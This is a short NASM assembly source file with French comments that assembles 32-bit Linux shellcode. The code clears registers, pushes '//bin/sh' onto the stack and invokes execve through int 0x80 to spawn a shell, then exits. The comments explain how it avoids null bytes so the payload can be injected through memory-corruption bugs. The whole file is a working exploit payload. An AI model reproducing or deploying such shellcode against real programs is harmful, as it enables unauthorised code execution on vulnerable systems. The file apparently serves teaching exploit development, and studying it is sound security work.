;nasm -f bin shell.asm -o shell.bin
bits 32

shellcode:
    ; on reinitialise les registres suivant
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    mov al, 11 ; on fais appel au syscall 11 execve al pour eviter les null-bytes
    push ebx ; ebx = 0 on a notre null-bytes
    push `n/sh`
    push `//bi` ; on pousse sur la pile a lire de bas en haut donc //bin/sh

    mov ebx, esp ; on met dans ebx l'addresse de notre chaine

    ; ecx et edx son deja (NULL) (0)

    int 0x80 ; on execute l'appel systeme

    mov al, 1
    xor ebx, ebx
    int 0x80 ; on sort du programme

